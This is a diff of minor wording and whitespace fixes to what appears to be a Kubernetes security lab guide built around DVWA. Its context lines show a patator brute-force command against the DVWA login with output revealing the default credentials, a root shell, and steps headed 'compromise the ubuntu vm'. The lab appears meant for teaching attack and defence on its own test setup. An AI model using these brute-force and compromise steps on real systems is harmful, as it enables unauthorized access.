@@ -46,7 +46,7 @@ ubuntu@ip-10-0-4-175:~$ kubectl apply -f dvwa-deployment.yaml
 - check and configure the DVWA (login: admin/password)
 - Open a browser and navigate to http://${module.ubuntu-k8s-instance.public_ip}:8080.
 - Log in to DVWA using `admin` with the password `password`.
-- Once logged in, click on "Create / Reset Database" after which, you will be logged out. Log back in to the web application and click on "Command Injection."
+- Once logged in, select "Create / Reset Database" after which, you will be logged out. Log back in to the web application and select "Command Injection."
 - Next, open three command line terminals and continue the setup process.
 
 - get the POD name
@@ -135,7 +135,7 @@ SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)
 patator http_fuzz 1=/usr/share/wordlists/metasploit/http_default_users.txt 0=/usr/share/wordlists/metasploit/http_default_pass.txt --threads=8 timeout=1 --rate-limit=1 url="http://${module.ubuntu-k8s-instance.private_ip}:8080/login.php" method=POST body="username=FILE1&password=FILE0&user_token=$\{CSRF}&Login=Login" header="Cookie: PHPSESSID=$\{SESSIONID}" -x ignore:fgrep=login.php -x quit:fgrep=index.php follow=0 accept_cookie=0
 
 09:01:15 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.10 at 2022-06-03 09:01 UTC
-09:01:15 patator    INFO -                                                                              
+09:01:15 patator    INFO -
 09:01:15 patator    INFO - code size:clen       time | candidate                          |   num | mesg
 09:01:15 patator    INFO - -----------------------------------------------------------------------------
 09:01:17 patator    INFO - 302  424:0          0.012 | password:admin                     |    15 | HTTP/1.1 302 Found
@@ -210,7 +210,7 @@ id
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
 ```
 
-- next we compromise the the ubuntu vm
+- next we compromise the ubuntu vm
 - login via another console to your Kali machine
 
 ```bash
@@ -256,7 +256,7 @@ password: ${random_string.suffix.result}
 bash -c "$(curl -sSL https://install.mondoo.com/sh/cnquery)"
 ```
 
-### List all privileged Pods 
+### List all privileged Pods
 
 - kubectl cli
 
@@ -554,7 +554,7 @@ spec:
 '
 ```
 
-- next we compromise the the ubuntu vm
+- next we compromise the ubuntu vm
 - login via another console to your Kali machine
 
 ```bash
